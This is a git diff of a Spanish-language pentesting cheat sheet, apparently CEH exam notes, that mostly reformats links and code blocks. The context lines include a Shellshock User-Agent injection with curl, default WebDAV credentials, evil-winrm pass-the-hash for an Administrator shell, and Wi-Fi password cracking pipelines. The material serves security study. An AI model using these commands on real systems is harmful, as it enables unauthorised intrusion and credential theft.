@@ -23,13 +23,12 @@ tags:
 </p>
 
 
-## Preparación para examen 
-
-https://ceh.cagy.org/ 
+## Preparación para examen CEH
+<https://ceh.cagy.org/ >
 
 ### 7z2john 
 Extrae el hash de cifrado de password de un 7zip para romperlo con john
-Necesita compilar esta librería https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz 
+Necesita compilar esta librería <https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz>
 
 ### AirNG 
 Suite que Monitorea y sirve para capturar/romper passwords de routers wifi 
@@ -58,7 +57,7 @@ para conectarse a servicios webdav
 
 ```bash
 $cadaver http://<ip>/webdav 
-login to the XAMPP server's WebDAV folder  
+login to the XAMPP servers WebDAV folder  
 cadaver http://<REMOTE HOST>/webdav/ 
 user: wampp 
 pass: xampp  
@@ -85,7 +84,7 @@ curl -H "User-Agent: () { :;}; echo; <comando>" http://hello.com/cgi-bin/<cualqu
 ```
 
 ### CertUtil 
-https://www.hackingarticles.in/windows-for-pentester-certutil/ 
+<https://www.hackingarticles.in/windows-for-pentester-certutil/ >
 
 ### CUPP 
 crea diccionario en función de un cuestionario para perfilar. (git clone https://github.com/Mebus/cupp.git) 
@@ -100,7 +99,7 @@ Crea password para hacer diccionarios
 crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something 
 crunch 8 8 0123456789 | pyrit -r msc-01.cap -i - attack_passthrough 
 crunch 6 7 eghotu0134 | perl -ne 'print unless /([a-z]).*\1/' > wordlist.txt 
-crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  (genera números de celulares chilenos) 
+crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  #genera números de celulares chilenos
 ```
 
 ### Dig 
@@ -116,8 +115,6 @@ enumera urls disponibles de un dominio, por medio de probar las carpetas más co
 dirb http://<sitio>/<path>;  dirb http://192.168.1.103 -X .php 
 ```
 
- 
-
 ### dmitry
 para obtención de información 
 
@@ -125,7 +122,6 @@ para obtención de información
 dmitry -s -n <host> 
 ```
 
- 
 ### DNSenum 
 Enumera información de los servidores DNS 
 
@@ -138,10 +134,9 @@ Obtiene información de los DNS
 ### Empire
 Agente de post-explotación de PowerShell puro basado en comunicaciones criptográficas seguras y una arquitectura flexible. 
 
- 
-
 ### Enum4linux 
-https://highon.coffee/blog/enum4linux-cheat-sheet/ 
+Enumerador de usuarios y carpetas compatidas
+<https://highon.coffee/blog/enum4linux-cheat-sheet/ >
 
 ### Ettercap 
 para arpoisoning / MITM1 
@@ -158,7 +153,7 @@ evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user Administr
 ```
 Crea una shell directamente en el equipo windows. 
 
-https://blog.spookysec.net/kerberos-abuse/ 
+<https://blog.spookysec.net/kerberos-abuse/ >
 
 
 ### fcrackzip 
@@ -202,7 +197,6 @@ Para conectarse al puerto 21. En caso de no querer responder al ls, probar ponie
 
 ### Gpg
 Encripta y desencripta PGP  (no es necesario usar openssl) 
-
 En caso de encontrar *.pgp y private.asc 
 
 ```bash
@@ -238,6 +232,7 @@ grep 'c:\\users\\' #para evitar el backslash trailing. Es necesario usar comilla
 
 ### Flags 
 
+```bash
 -R Does a recursive grep search for the files inside the folders(if found in the specified path for pattern search; else grep won't traverse diretory for searching the pattern you specify) 
 -h If you're grepping recursively in a directory, this flag disables the prefixing of filenames in the results. 
 -c This flag won't list you the pattern only list an integer value, that how many times the pattern was found in the file/folder. 
@@ -247,6 +242,7 @@ grep 'c:\\users\\' #para evitar el backslash trailing. Es necesario usar comilla
 -v This flag prints all the lines that are NOT containing the pattern 
 -E This flag we already read above... will consider the PATTERN as a regular expression to find the matching strings.  
 -e The official documentation says, it can be used to specify multiple patterns and if any string matches with the pattern(s) it will list it. 
+```
 Desde <https://tryhackme.com/room/linuxmodules>  
 
  
@@ -557,7 +553,8 @@ tshark -nnr imadecoy -qz ip_hosts,tree (estadísticas de tráfico)
 $tshark -r <captured.cap>         #analiza tráfico 
 $tshark -r <captured.cap> -Tjson  #muestra todos los campos 
 $tshark -r <captured.cap> -Tfields -e <campo> #filtra sólo por un campo ejemplo data.data 
-$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  #traduce el contenido de hex a textoplano ```
+$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  #traduce el contenido de hex a textoplano 
+```
  
 ### ViMdecript  
 <https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py >
